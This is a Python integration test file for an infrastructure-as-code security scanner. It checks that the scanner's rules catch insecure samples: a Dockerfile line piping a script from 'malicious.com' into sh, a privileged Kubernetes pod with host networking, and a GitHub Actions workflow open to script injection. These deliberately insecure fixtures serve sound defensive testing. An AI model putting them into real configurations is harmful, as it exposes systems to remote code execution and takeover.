"""Integration test suite for native IaC scanning using standard Rule Engine v2."""

import tempfile
from pathlib import Path

from karsasec.parser.ast import VisitorContext
from karsasec.parser.docker_parser import docker_parser_plugin
from karsasec.parser.github_actions_parser import gha_parser_plugin
from karsasec.parser.k8s_parser import k8s_parser_plugin
from karsasec.rules.loader import YAMLRuleLoader
from karsasec.rules.matcher import ASTMatcher, rule_compiler


def test_unified_docker_rule_matching() -> None:
    """Verify Dockerfile rule matching via ASTMatcher and Schema v2 rules."""
    docker_code = """FROM ubuntu:latest
USER root
RUN curl http://malicious.com/script.sh | sh
"""
    with tempfile.TemporaryDirectory() as tmpdir:
        file_path = Path(tmpdir) / "Dockerfile"
        file_path.write_text(docker_code)

        parse_res = docker_parser_plugin.parse_file(file_path)
        assert parse_res.root is not None

        loader = YAMLRuleLoader()
        rules = loader.load_directory(Path("karsasec/rules/patterns/docker"))
        assert len(rules) >= 3

        matcher = ASTMatcher()
        context = VisitorContext(file_node=parse_res.root, language="Dockerfile")

        matched_rules = set()
        for node_id, node in parse_res.root.nodes_map.items():
            node.language = "Dockerfile"
            for rule in rules:
                compiled = rule_compiler.compile(rule)
                res = matcher.match(node, compiled, context, source_bytes=docker_code.encode("utf-8"))
                if res.matched:
                    matched_rules.add(rule.id)

        assert "KS-DOCKER-0001" in matched_rules  # Root user
        assert "KS-DOCKER-0002" in matched_rules  # Latest tag
        assert "KS-DOCKER-0004" in matched_rules  # curl | sh


def test_unified_kubernetes_rule_matching() -> None:
    """Verify Kubernetes YAML rule matching via ASTMatcher and Schema v2 rules."""
    k8s_code = """apiVersion: v1
kind: Pod
metadata:
  name: test-pod
spec:
  hostNetwork: true
  containers:
  - name: web
    image: nginx
    securityContext:
      privileged: true
"""
    with tempfile.TemporaryDirectory() as tmpdir:
        file_path = Path(tmpdir) / "pod.yaml"
        file_path.write_text(k8s_code)

        parse_res = k8s_parser_plugin.parse_file(file_path)
        assert parse_res.root is not None

        loader = YAMLRuleLoader()
        rules = loader.load_directory(Path("karsasec/rules/patterns/kubernetes"))
        assert len(rules) >= 2

        matcher = ASTMatcher()
        context = VisitorContext(file_node=parse_res.root, language="Kubernetes")

        matched_rules = set()
        for node_id, node in parse_res.root.nodes_map.items():
            node.language = "Kubernetes"
            for rule in rules:
                compiled = rule_compiler.compile(rule)
                res = matcher.match(node, compiled, context, source_bytes=k8s_code.encode("utf-8"))
                if res.matched:
                    matched_rules.add(rule.id)

        assert "KS-K8S-0001" in matched_rules  # Privileged
        assert "KS-K8S-0003" in matched_rules  # hostNetwork


def test_unified_github_actions_rule_matching() -> None:
    """Verify GitHub Actions YAML rule matching via ASTMatcher and Schema v2 rules."""
    gha_code = """name: Test Workflow
on:
  pull_request_target:
jobs:
  run-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - run: echo "PR title: ${{ github.event.issue.title }}"
"""
    with tempfile.TemporaryDirectory() as tmpdir:
        file_path = Path(tmpdir) / "ci.yml"
        file_path.write_text(gha_code)

        parse_res = gha_parser_plugin.parse_file(file_path)
        assert parse_res.root is not None

        loader = YAMLRuleLoader()
        rules = loader.load_directory(Path("karsasec/rules/patterns/github_actions"))
        assert len(rules) >= 2

        matcher = ASTMatcher()
        context = VisitorContext(file_node=parse_res.root, language="GitHub-Actions")

        matched_rules = set()
        for node_id, node in parse_res.root.nodes_map.items():
            node.language = "GitHub-Actions"
            for rule in rules:
                compiled = rule_compiler.compile(rule)
                res = matcher.match(node, compiled, context, source_bytes=gha_code.encode("utf-8"))
                if res.matched:
                    matched_rules.add(rule.id)

        assert "KS-GHA-0001" in matched_rules  # Inline script injection
        assert "KS-GHA-0002" in matched_rules  # pull_request_target
